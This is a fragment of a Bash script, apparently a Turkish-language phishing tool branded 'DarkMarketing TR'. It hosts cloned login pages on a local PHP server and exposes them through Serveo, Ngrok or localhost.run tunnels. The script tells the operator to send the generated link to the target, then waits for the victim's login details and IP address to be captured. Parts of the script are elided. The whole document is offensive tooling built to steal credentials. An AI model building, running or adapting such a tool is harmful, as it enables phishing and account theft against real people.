...
banner() {
clear
printf " \e[33;1m DarkMarketing TR Hacking Yazılımı                \e[0m\n"                                                 
printf " \e[33;1m          \e[1;97m  Version 2.1.7   \e[0m\n"
printf " \e[33;1m                   \e[1;97m This Software Protect by GPL 3.0 Lisence   \e[0m\n"
printf " \n"
printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Software coding by DarkMarketing TR\e[0m\n"
printf " \n"
printf " \e[36;1m{+ Hedefinizi Hacklemek İcin Lutfen Islem Secin +}\e[0m\n"
printf " \n"
}
menu() {
...
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Modul Belirtin : \e[0m\e[1;96m\en' option
...
d_o_server="2"
printf "\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Port Yontemi Secin : \e[0m\e[1;96m\en' option_server
...
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Port Secin (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
start_serveo
}
start_serveo() {
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Hizmet Yurutuluyor...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Serveo Calistiriliyor ..\e[0m\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
...
printf "\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Hedefinize bu linki gonderin :\e[0m\e[1;93m %s \n' $send_url
printf "\n"
found
}
start_n() {
...
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Hizmet Yurutuluyor...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:5555\e[0m\e[1;92m)\e[0m\n"
...
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Hata \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Lutfen Tum Paketleri Kurdugunuzdan Emin Olun.\e[0m\n"
exit 1
fi
else
...
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Ngrok Calistiriliyor...\e[0m\n"
...
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m LocalHostRun Calistiriliyor ..\e[0m\n"
printf "\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
...
found() {
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Giris Bilgileri Bekleniyor,\e[0m\e[1;96m Iptal etmek icin CTRL + C\e[0m\n"
printf "\n"
while [ true ]; do
if [[ -e "websites/$server/ip.txt" ]]; then
printf "\n"
